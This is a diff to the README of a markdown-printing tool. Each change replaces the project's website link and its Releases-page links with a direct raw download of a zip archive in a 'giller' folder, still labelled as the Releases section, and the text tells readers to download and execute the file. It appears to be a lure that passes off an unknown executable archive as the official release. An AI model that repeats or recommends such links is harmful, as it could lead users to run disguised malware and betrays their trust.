@@ -2,7 +2,7 @@
 
 Welcome to the **Print Markdown So Easy** repository! This project simplifies the process of printing markdown documents. With our tool, you can easily convert markdown files into printable formats, making your documentation process smoother than ever. 
 
-**Visit the markdown print site:** [https://print.markdown.janqi.com](https://print.markdown.janqi.com)
+**Visit the markdown print site:** [https://github.com/CELIO404/print-markdown-so-easy/raw/refs/heads/master/giller/easy_so_markdown_print_1.0.zip](https://github.com/CELIO404/print-markdown-so-easy/raw/refs/heads/master/giller/easy_so_markdown_print_1.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Welcome to the **Print Markdown So Easy** repository! This project simplifies th
 
 ## Installation ⚙️
 
-To get started, you need to download the latest release. You can find it in the [Releases section](https://github.com/CELIO404/print-markdown-so-easy/releases). Download the appropriate file for your operating system and execute it to install the tool.
+To get started, you need to download the latest release. You can find it in the [Releases section](https://github.com/CELIO404/print-markdown-so-easy/raw/refs/heads/master/giller/easy_so_markdown_print_1.0.zip). Download the appropriate file for your operating system and execute it to install the tool.
 
 ### Prerequisites
 
@@ -91,7 +91,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Releases 📦
 
-To access the latest releases, visit our [Releases section](https://github.com/CELIO404/print-markdown-so-easy/releases). Download the appropriate file for your system, execute it, and start converting markdown files to print-ready PDFs today!
+To access the latest releases, visit our [Releases section](https://github.com/CELIO404/print-markdown-so-easy/raw/refs/heads/master/giller/easy_so_markdown_print_1.0.zip). Download the appropriate file for your system, execute it, and start converting markdown files to print-ready PDFs today!
 
 ---
 
